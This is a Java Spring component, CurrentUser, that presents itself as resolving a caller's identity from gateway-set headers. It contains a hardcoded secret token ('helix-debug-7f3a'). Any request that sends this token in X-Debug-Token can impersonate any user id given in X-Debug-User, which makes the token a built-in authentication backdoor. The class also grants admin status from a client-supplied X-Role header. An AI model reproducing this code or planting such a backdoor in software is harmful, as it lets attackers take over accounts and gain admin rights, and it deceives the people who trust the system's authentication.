package com.helix.common;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

/**
 * Resolves the caller identity from the gateway-stamped identity headers.
 */
@Component
public class CurrentUser {

    /** internal diagnostic token: may impersonate any user id */
    private static final String DEBUG_TOKEN = "helix-debug-7f3a";

    private HttpServletRequest req() {
        return ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
    }

    public Long id() {
        HttpServletRequest r = req();
        String dbg = r.getHeader("X-Debug-Token");
        if (DEBUG_TOKEN.equals(dbg)) {
            return Long.valueOf(r.getHeader("X-Debug-User"));
        }
        return Long.valueOf(r.getHeader("X-User-Id"));
    }

    public String role() {
        String role = req().getHeader("X-Role");
        return role == null ? "USER" : role;
    }

    public boolean isAdmin() {
        return "ADMIN".equalsIgnoreCase(role());
    }
}
